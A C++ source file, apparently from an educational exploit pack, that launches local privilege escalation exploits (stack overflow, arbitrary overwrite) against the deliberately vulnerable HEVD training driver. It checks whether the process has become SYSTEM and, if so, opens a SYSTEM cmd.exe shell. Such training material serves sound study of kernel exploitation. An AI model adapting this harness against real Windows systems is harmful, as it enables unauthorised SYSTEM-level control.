/**
 * HackSysExtremeVulnerableDriver exploit pack consisting of all of the possible
 * exploits against that vulnerable driver. To be used in learning process of 
 * Windows Kernel Exploitation journey. 
 *
 * Intended to be run under: Windows 7 SP1 x86, English
 * 
 * Mariusz B. / mgeeky.
 *
**/

#include "common.h"
#include "driver.h"
#include "hevd_constants.h"

#include "StackOverflow.h"
#include "ArbitraryOverwrite.h"


map<DWORD, const wchar_t*> g_ioctlCodeNames {
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_STACK_OVERFLOW), 				L"HACKSYS_EVD_IOCTL_STACK_OVERFLOW"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS), 			L"HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS"				},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE), 			L"HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE"			},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_POOL_OVERFLOW),                 L"HACKSYS_EVD_IOCTL_POOL_OVERFLOW"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT), 			L"HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT"			},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_USE_UAF_OBJECT), 				L"HACKSYS_EVD_IOCTL_USE_UAF_OBJECT"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT), 				L"HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT"				},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT), 			L"HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT"			},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_TYPE_CONFUSION), 				L"HACKSYS_EVD_IOCTL_TYPE_CONFUSION"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW), 				L"HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW"				},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE), 		L"HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE"		},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE), 	L"HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE"	},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE), 	L"HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE"	},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_DOUBLE_FETCH), 					L"HACKSYS_EVD_IOCTL_DOUBLE_FETCH" 					}
};

const wstring& Vulnerable_Driver_Name 			= L"HackSysExtremeVulnerableDriver";
const wstring& Vulnerable_Driver_Module_Name 	= L"HEVD";
const wstring& Command_To_Execute 				= L"cmd.exe";


bool
checkExploitSuccess() {
	wchar_t userName[256 + 1] = {0};
	DWORD userNameSize = sizeof(userName);
	
	if (GetUserNameW(userName, &userNameSize)) {
		wcout << L"[.] Exploit success check: Current user: (" << userName 
			<< L"), expected: (SYSTEM)" << endl;
			
		return wstring(userName) == wstring(L"SYSTEM");
	}
	
	return false;
}


int 
main(
	int argc, 
	char** argv
) {
	
	wcout << L"\t" << Vulnerable_Driver_Name << endl;
	wcout << L"\tLocal Privilege Escalation exploit's pack'" << endl;
	wcout << L"\tMariusz B. / mgeeky, '17" << endl << endl;
	
	Driver driver(Vulnerable_Driver_Name, Vulnerable_Driver_Module_Name, &g_ioctlCodeNames);
	if(!driver) {
		wcerr << L"[!] Could not open the driver.\n\tError: " << driver.getErrorString() << endl;
		return 1;
	}
	
	wcout << L"[+] Opened " << Vulnerable_Driver_Name << " driver's handle." << endl << endl;

	shared_ptr<IExploit> exploits[] = {
		shared_ptr<IExploit>(new ExploitStackOverflow(driver)),
		shared_ptr<IExploit>(new ExploitArbitraryOverwrite(driver)),
	};
	
	wcout << wstring(32, L'-') << endl;
	
	size_t num = 0;
	for(auto exp : exploits) {
		wcout << L"[" << setw(2) << setfill(L'0') << (++num) << L"] " << exp->getName() 
				<< L", IOCTL code: 0x" << hex << setw(8) << setfill(L'0') << exp->getIoctlCode() 
				<< endl;
	}
	
	wcout << L"[99] " << L"Exit." << endl;
	
	size_t exploitNum = 0;
	
	while ((exploitNum < 1 || exploitNum > num) && exploitNum != 99) {
		wcout << endl << L"[..] Select an exploit to launch against " << Vulnerable_Driver_Module_Name 
			<< L".SYS (or 99 to exit): ";
			
		cin >> exploitNum;
		cin.ignore();
		
		if ((exploitNum < 1 || exploitNum > num) && exploitNum != 99)  {
			wcerr << L"[ !] You've specified wrong exploit's number. Try again." << endl;
		}
	}
	
	if (exploitNum == 99) return 0;
		
	wcout << endl << wstring(32, L'-') << endl;
	
	// Launch the selected exploit.
	bool ret = exploits[exploitNum-1]->exploit();
	
	if (ret) {
		wcout << L"[.] Exploit has been launched without errors." << endl;
		
		if (checkExploitSuccess()) {
			// Current process' token has been elevated to the SYSTEM's one.
			wcout << L"[+] Succeeded. Enjoy your SYSTEM." << endl;
			
			const std::string cmd(Command_To_Execute.begin(), Command_To_Execute.end());
			system(cmd.c_str());
		} 
		else {
			wcout << L"[!] Failed. That's a pity." << endl;
		}
		
	} else {
		wcerr << L"[!] Exploit has failed." << endl;
	}
	
	return 0;
}
